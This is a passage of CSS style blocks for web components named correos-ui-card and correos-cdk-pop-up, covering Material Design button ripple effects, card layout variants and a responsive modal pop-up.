			.mdc-button--unelevated.sc-correos-ui-card:not(:disabled) {
				background-color: var(--mdc-theme-primary, #6200ee)
			}
		}

		.mdc-button--raised.sc-correos-ui-card:not(:disabled),
		.mdc-button--unelevated.sc-correos-ui-card:not(:disabled) {
			color: #fff;
			color: var(--mdc-theme-on-primary, #fff)
		}

		.mdc-button--raised.sc-correos-ui-card {
			-webkit-box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
			-webkit-transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)
		}

		.mdc-button--raised.sc-correos-ui-card:hover,
		.mdc-button--raised.sc-correos-ui-card:focus {
			-webkit-box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--raised.sc-correos-ui-card:active {
			-webkit-box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--raised.sc-correos-ui-card:disabled {
			-webkit-box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--outlined.sc-correos-ui-card {
			border-style: solid;
			padding: 0 15px 0 15px;
			border-width: 1px
		}

		.mdc-button--outlined.sc-correos-ui-card:disabled {
			border-color: rgba(0, 0, 0, 0.37)
		}

		.mdc-button--outlined.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card {
			top: -1px;
			left: -1px;
			border: 1px solid transparent
		}

		.mdc-button--outlined.sc-correos-ui-card:not(:disabled) {
			border-color: #6200ee;
			border-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-button--touch.sc-correos-ui-card {
			margin-top: 6px;
			margin-bottom: 6px
		}

		@-webkit-keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		@keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-card {
			--mdc-ripple-surface-test-edge-var: 1px solid #000;
			visibility: hidden
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-card::before {
			border: var(--mdc-ripple-surface-test-edge-var)
		}

		.mdc-button.sc-correos-ui-card {
			--mdc-ripple-fg-size: 0;
			--mdc-ripple-left: 0;
			--mdc-ripple-top: 0;
			--mdc-ripple-fg-scale: 1;
			--mdc-ripple-fg-translate-end: 0;
			--mdc-ripple-fg-translate-start: 0;
			-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
		}

		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			position: absolute;
			border-radius: 50%;
			opacity: 0;
			pointer-events: none;
			content: ""
		}

		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before {
			-webkit-transition: opacity 15ms linear, background-color 15ms linear;
			transition: opacity 15ms linear, background-color 15ms linear;
			z-index: 1
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before {
			-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
			transform: scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			top: 0;
			left: 0;
			-webkit-transform: scale(0);
			transform: scale(0);
			-webkit-transform-origin: center center;
			transform-origin: center center
		}

		.mdc-button.mdc-ripple-upgraded--unbounded.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			top: var(--mdc-ripple-top, 0);
			left: var(--mdc-ripple-left, 0)
		}

		.mdc-button.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
			animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
		}

		.mdc-button.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
			animation: mdc-ripple-fg-opacity-out 150ms;
			-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
			transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			top: calc(50% - 100%);
			left: calc(50% - 100%);
			width: 200%;
			height: 200%
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			width: var(--mdc-ripple-fg-size, 100%);
			height: var(--mdc-ripple-fg-size, 100%)
		}

		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			background-color: #6200ee
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
			.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
				background-color: var(--mdc-theme-primary, #6200ee)
			}
		}

		.mdc-button.sc-correos-ui-card:hover .mdc-button__ripple.sc-correos-ui-card::before {
			opacity: 0.04
		}

		.mdc-button.mdc-ripple-upgraded--background-focused.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button.sc-correos-ui-card:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-card::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-button.sc-correos-ui-card:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-card::after {
			-webkit-transition: opacity 150ms linear;
			transition: opacity 150ms linear
		}

		.mdc-button.sc-correos-ui-card:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-card::after {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-card {
			--mdc-ripple-fg-opacity: 0.12
		}

		.mdc-button.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card {
			position: absolute;
			-webkit-box-sizing: content-box;
			box-sizing: content-box;
			width: 100%;
			height: 100%;
			overflow: hidden
		}

		.mdc-button.sc-correos-ui-card:not(.mdc-button--outlined) .mdc-button__ripple.sc-correos-ui-card {
			top: 0;
			left: 0
		}

		.mdc-button--raised.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button--raised.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after,
		.mdc-button--unelevated.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button--unelevated.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
			background-color: #fff
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button--raised.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
			.mdc-button--raised.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after,
			.mdc-button--unelevated.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
			.mdc-button--unelevated.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::after {
				background-color: var(--mdc-theme-on-primary, #fff)
			}
		}

		.mdc-button--raised.sc-correos-ui-card:hover .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button--unelevated.sc-correos-ui-card:hover .mdc-button__ripple.sc-correos-ui-card::before {
			opacity: 0.08
		}

		.mdc-button--raised.mdc-ripple-upgraded--background-focused.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button--raised.sc-correos-ui-card:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button--unelevated.mdc-ripple-upgraded--background-focused.sc-correos-ui-card .mdc-button__ripple.sc-correos-ui-card::before,
		.mdc-button--unelevated.sc-correos-ui-card:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-card::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.24
		}

		.mdc-button--raised.sc-correos-ui-card:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-card::after,
		.mdc-button--unelevated.sc-correos-ui-card:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-card::after {
			-webkit-transition: opacity 150ms linear;
			transition: opacity 150ms linear
		}

		.mdc-button--raised.sc-correos-ui-card:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-card::after,
		.mdc-button--unelevated.sc-correos-ui-card:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-card::after {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.24
		}

		.mdc-button--raised.mdc-ripple-upgraded.sc-correos-ui-card,
		.mdc-button--unelevated.mdc-ripple-upgraded.sc-correos-ui-card {
			--mdc-ripple-fg-opacity: 0.24
		}

		.mdc-button.sc-correos-ui-card {
			height: 36px
		}

		.sc-correos-ui-card-h {
			--_ui-card-bg-color: var(--ui-card-bg-color, magenta);
			--_ui-card-border-radius: var(--ui-card-border-radius, 0px);
			--_ui-card-border-color: var(--ui-card-border-color, blue);
			--_ui-card-icon-bg-color: var(--ui-card-icon-bg-color, green);
			--_ui-card-border-shadow: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
			--_ui-card-border-shadow-hover: 0 10px 20px 0 rgba(0, 0, 0, 0.25);
			--_ui-card-text-color: var(--ui-card-text-color, yellow);
			--_ui-card-border-active: var(--ui-card-border-active, pink);
			--_ui-card-bg-image: var(--ui-card-bg-image, teal);
			--_ui-card-color-icon: var(--ui-card-color-icon, purple);
			--_ui-card-color-description: var(--theme-color-strongGrey)
		}

		.sc-correos-ui-card-h {
			display: -ms-flexbox;
			display: flex;
			height: 100%;
			width: 100%;
			-ms-flex-pack: center;
			justify-content: center;
			-ms-flex-align: center;
			align-items: center;
			-webkit-box-shadow: var(--_ui-card-border-shadow);
			box-shadow: var(--_ui-card-border-shadow);
			border-radius: var(--_ui-card-border-radius);
			background-color: var(--_ui-card-bg-color);
			-webkit-transition: -webkit-box-shadow 0.2s ease-in-out;
			transition: -webkit-box-shadow 0.2s ease-in-out;
			transition: box-shadow 0.2s ease-in-out;
			transition: box-shadow 0.2s ease-in-out, -webkit-box-shadow 0.2s ease-in-out;
			border: solid 1px var(--_ui-card-border-color)
		}

		.sc-correos-ui-card-h:hover {
			-webkit-box-shadow: var(--_ui-card-border-shadow-hover);
			box-shadow: var(--_ui-card-border-shadow-hover);
			cursor: pointer
		}

		.sc-correos-ui-card-h:hover .sc-correos-ui-card-s>[slot=text] {
			text-decoration: underline
		}

		.sc-correos-ui-card-h:active {
			border: 2px solid var(--_ui-card-border-active)
		}

		.sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			-ms-flex-align: center;
			align-items: center;
			text-decoration: none;
			padding: 16px
		}

		.sc-correos-ui-card-h .ui-title.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			-ms-flex-align: center;
			align-items: center
		}

		.sc-correos-ui-card-h .sc-correos-ui-card-s>[slot=image] {
			display: block;
			width: 40px;
			height: 40px;
			margin-bottom: 8px
		}

		.sc-correos-ui-card-h .sc-correos-ui-card-s>[slot=icon] {
			width: 40px;
			height: 40px
		}

		.sc-correos-ui-card-h .sc-correos-ui-card-s>[slot=text] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--_ui-card-text-color);
			font-size: 0.75rem;
			line-height: 1.175rem;
			text-align: center
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-card-h .sc-correos-ui-card-s>[slot=text] {
				font-size: 0.875rem;
				line-height: 1.25rem
			}
		}

		[size=md].sc-correos-ui-card-h,
		[size=lg].sc-correos-ui-card-h {
			-ms-flex-pack: start;
			justify-content: flex-start
		}

		[size=md].sc-correos-ui-card-h .ui-title.sc-correos-ui-card,
		[size=lg].sc-correos-ui-card-h .ui-title.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		[size=md].sc-correos-ui-card-h .ui-container.sc-correos-ui-card,
		[size=lg].sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			width: 100%
		}

		.sc-correos-ui-card-h[size=md] .sc-correos-ui-card-s>[slot=image],
		.sc-correos-ui-card-h[size=lg] .sc-correos-ui-card-s>[slot=image] {
			margin-bottom: 0;
			margin-right: 16px
		}

		.sc-correos-ui-card-h[size=md] .sc-correos-ui-card-s>[slot=text],
		.sc-correos-ui-card-h[size=lg] .sc-correos-ui-card-s>[slot=text] {
			text-align: left
		}

		[size=lg].sc-correos-ui-card-h .ui-title.sc-correos-ui-card {
			-ms-flex-direction: row;
			flex-direction: row
		}

		[variant=shortcut].sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			width: 100%
		}

		[variant=shortcut].sc-correos-ui-card-h .ui-title.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		.sc-correos-ui-card-h[variant=shortcut] .sc-correos-ui-card-s>[slot=text] {
			text-align: initial;
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-card-h[variant=shortcut] .sc-correos-ui-card-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-card-h[variant=shortcut] .sc-correos-ui-card-s>[slot=icon] {
			margin-right: 8px;
			color: var(--_ui-card-color-icon);
			border-radius: 50%;
			background: var(--_ui-card-bg-image);
			width: 40px;
			height: 40px
		}

		[variant=shortcut][size=md].sc-correos-ui-card-h .ui-container.sc-correos-ui-card,
		[variant=shortcut][size=lg].sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row
		}

		.sc-correos-ui-card-h[variant=shortcut][size=md] .sc-correos-ui-card-s>[slot=icon],
		.sc-correos-ui-card-h[variant=shortcut][size=lg] .sc-correos-ui-card-s>[slot=icon] {
			margin-right: 16px
		}

		[variant=description].sc-correos-ui-card-h .ui-title.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			-ms-flex-align: center;
			align-items: center
		}

		[variant=description].sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			-ms-flex-align: start;
			align-items: flex-start
		}

		.sc-correos-ui-card-h[variant=description] .sc-correos-ui-card-s>[slot=text] {
			color: var(--_ui-card-text-color);
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-card-h[variant=description] .sc-correos-ui-card-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-card-h[variant=description] .sc-correos-ui-card-s>[slot=icon] {
			margin-right: 16px;
			margin-bottom: 0;
			color: var(--_ui-card-color-icon);
			border-radius: 50%;
			background: var(--_ui-card-bg-image);
			width: 40px;
			height: 40px
		}

		.sc-correos-ui-card-h[variant=description] .sc-correos-ui-card-s>[slot=description] {
			display: none
		}

		.sc-correos-ui-card-h[variant=description][size=lg] .sc-correos-ui-card-s>[slot=description] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			display: -ms-flexbox;
			display: flex;
			color: var(--_ui-card-color-description);
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: 300;
			margin-left: 55px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-card-h[variant=description][size=lg] .sc-correos-ui-card-s>[slot=description] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-card-h[variant=startups] .sc-correos-ui-card-s>[slot=icon] {
			width: 120px;
			height: 45px;
			-o-object-fit: cover;
			object-fit: cover;
			margin-bottom: 16px
		}

		.sc-correos-ui-card-h[variant=startups] .sc-correos-ui-card-s>[slot=image] {
			width: 120px;
			height: 45px;
			-o-object-fit: cover;
			object-fit: cover;
			margin-bottom: 16px
		}

		[variant=full-width].sc-correos-ui-card-h {
			padding: 16px 16px 16px;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			-ms-flex: 0 1 100%;
			flex: 0 1 100%
		}

		@media (min-width: 640px) {
			[variant=full-width].sc-correos-ui-card-h {
				-ms-flex: 0 1 calc(50% - 8px);
				flex: 0 1 calc(50% - 8px)
			}
		}

		@media (min-width: 1024px) {
			[variant=full-width].sc-correos-ui-card-h {
				-ms-flex: 0 1 calc(50% - 8px);
				flex: 0 1 calc(50% - 8px)
			}
		}

		.sc-correos-ui-card-h[variant=full-width] .sc-correos-ui-card-s>[slot=text] {
			text-align: initial;
			font-size: 0.875rem;
			line-height: 1.375rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-card-h[variant=full-width] .sc-correos-ui-card-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		.sc-correos-ui-card-h[variant=full-width] .sc-correos-ui-card-s>[slot=icon] {
			margin-right: 8px;
			color: var(--_ui-card-color-icon);
			border-radius: 50%;
			background: var(--_ui-card-bg-image);
			width: 40px;
			height: 40px
		}

		[variant=full-width].sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
			border: unset;
			cursor: pointer;
			margin: 0;
			padding: 0;
			width: unset;
			overflow: unset;
			background: unset;
			text-align: flex-start;
			color: inherit;
			font: inherit;
			line-height: inherit;
			-webkit-font-smoothing: inherit;
			-moz-osx-font-smoothing: inherit;
			-webkit-appearance: none;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			-ms-flex-align: center;
			align-items: center;
			text-decoration: none;
			width: 100%
		}

		[variant=full-width].sc-correos-ui-card-h .ui-container.sc-correos-ui-card::-moz-focus-inner {
			border: 0;
			padding: 0
		}

		@media (min-width: 1024px) {
			[variant=full-width].sc-correos-ui-card-h .ui-container.sc-correos-ui-card {
				-ms-flex-direction: row;
				flex-direction: row;
				-ms-flex-pack: start;
				justify-content: flex-start
			}
		}

		[variant=full-width].sc-correos-ui-card-h .ui-container.sc-correos-ui-card:focus {
			outline: none
		}

		[variant=full-width].sc-correos-ui-card-h .ui-container.focus-visible.sc-correos-ui-card {
			text-decoration: underline
		}
	</style>
	<style>
		@charset "UTF-8";

		.sc-correos-cdk-pop-up-h {
			--_cdk-pop-up-bg-overlay: rgba(0, 0, 0, 0.6);
			--_cdk-pop-up-border-modal: 1px solid var(--cdk-pop-up-border-modal, blue);
			--_cdk-pop-up-bg-modal: var(--cdk-pop-up-bg-modal, purple);
			--_cdk-pop-up-box-shadow: var(--cdk-pop-up-box-shadow);
			--_cdk-pop-up-border-title: 1px solid var(--cdk-pop-up-border-title, green);
			--_cdk-pop-up-color-icon: var(--cdk-pop-up-color-icon, teal)
		}

		.sc-correos-cdk-pop-up-h {
			display: block
		}

		.sc-correos-cdk-pop-up-h .cdk-container.sc-correos-cdk-pop-up {
			position: fixed;
			opacity: 0;
			visibility: hidden;
			-webkit-transform: scale(1.1);
			transform: scale(1.1);
			-webkit-transition: visibility 0s linear 0.25s, opacity 0.25s 0s, -webkit-transform 0.25s;
			transition: visibility 0s linear 0.25s, opacity 0.25s 0s, -webkit-transform 0.25s;
			transition: visibility 0s linear 0.25s, opacity 0.25s 0s, transform 0.25s;
			transition: visibility 0s linear 0.25s, opacity 0.25s 0s, transform 0.25s, -webkit-transform 0.25s;
			z-index: 16;
			width: 100%;
			height: 100%;
			top: 0;
			left: 0;
			background-color: var(--_cdk-pop-up-bg-overlay)
		}

		.sc-correos-cdk-pop-up-h .contribution-container.sc-correos-cdk-pop-up {
			position: static !important;
			z-index: auto !important
		}

		.sc-correos-cdk-pop-up-h .contribution-container.sc-correos-cdk-pop-up .cdk-modal.sc-correos-cdk-pop-up {
			position: static !important;
			top: 0 !important;
			left: 0 !important;
			-webkit-transform: none !important;
			transform: none !important
		}

		.sc-correos-cdk-pop-up-h .cdk-footer__buttons.sc-correos-cdk-pop-up {
			width: 100%
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-pop-up-h .cdk-footer__buttons.sc-correos-cdk-pop-up {
				width: auto
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h .cdk-footer__buttons.sc-correos-cdk-pop-up {
				width: auto
			}
		}

		.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column-reverse;
			flex-direction: column-reverse;
			-ms-flex-align: center;
			align-items: center
		}

		.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:last-child {
			width: 100%
		}

		@media (max-width: 639px) {
			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:not(last-child) {
				margin-bottom: 16px
			}
		}

		.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons]:empty {
			display: none
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] {
				margin: 16px;
				-ms-flex-direction: row;
				flex-direction: row
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:first-child {
				margin-right: 17px
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:last-child {
				width: auto
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] {
				-ms-flex-direction: row;
				flex-direction: row;
				margin: 24px
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:first-child {
				margin-right: 17px
			}

			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=buttons] correos-ui-button:last-child {
				width: auto;
				margin-right: 0px
			}
		}

		.sc-correos-cdk-pop-up-h .cdk-visible.sc-correos-cdk-pop-up {
			opacity: 1;
			visibility: visible;
			-webkit-transform: scale(1);
			transform: scale(1);
			-webkit-transition: visibility 0s linear 0s, opacity 0.25s 0s, -webkit-transform 0.25s;
			transition: visibility 0s linear 0s, opacity 0.25s 0s, -webkit-transform 0.25s;
			transition: visibility 0s linear 0s, opacity 0.25s 0s, transform 0.25s;
			transition: visibility 0s linear 0s, opacity 0.25s 0s, transform 0.25s, -webkit-transform 0.25s
		}

		.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
			position: absolute;
			left: 50%;
			-webkit-transform: translate(-50%, 0);
			transform: translate(-50%, 0);
			top: auto;
			bottom: 0;
			border: var(--_cdk-pop-up-border-modal);
			border-radius: 8px 8px 0 0;
			background-color: var(--_cdk-pop-up-bg-modal);
			-webkit-box-shadow: var(--_cdk-pop-up-box-shadow);
			box-shadow: var(--_cdk-pop-up-box-shadow);
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			max-height: 80%;
			min-height: 440px;
			-ms-flex-direction: column;
			flex-direction: column
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				max-width: 750px;
				width: calc(100% - 32px)
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
				max-width: 1088px;
				width: calc(100% - 80px);
				top: 50%;
				bottom: auto;
				-webkit-transform: translate(-50%, -50%);
				transform: translate(-50%, -50%);
				border-radius: 8px
			}
		}

		.sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
			width: 100%;
			display: -ms-flexbox;
			display: flex;
			max-height: 100%;
			min-height: 440px;
			-ms-flex-direction: column;
			flex-direction: column
		}

		.sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: justify;
			justify-content: space-between;
			margin: 16px;
			padding-bottom: 16px;
			border-bottom: var(--_cdk-pop-up-border-title)
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
				margin: 24px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
				margin: 40px
			}
		}

		.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=title] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1.125rem;
			line-height: 1.625rem
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h .sc-correos-cdk-pop-up-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem
			}
		}

		.sc-correos-cdk-pop-up-h .cdk-icon.sc-correos-cdk-pop-up {
			cursor: pointer;
			color: var(--_cdk-pop-up-color-icon)
		}

		.sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
			margin: 0 16px
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
				margin: 0 24px
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
				margin: 0 40px
			}
		}

		.sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up>.cdk-footer__info.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: justify;
			justify-content: space-between
		}

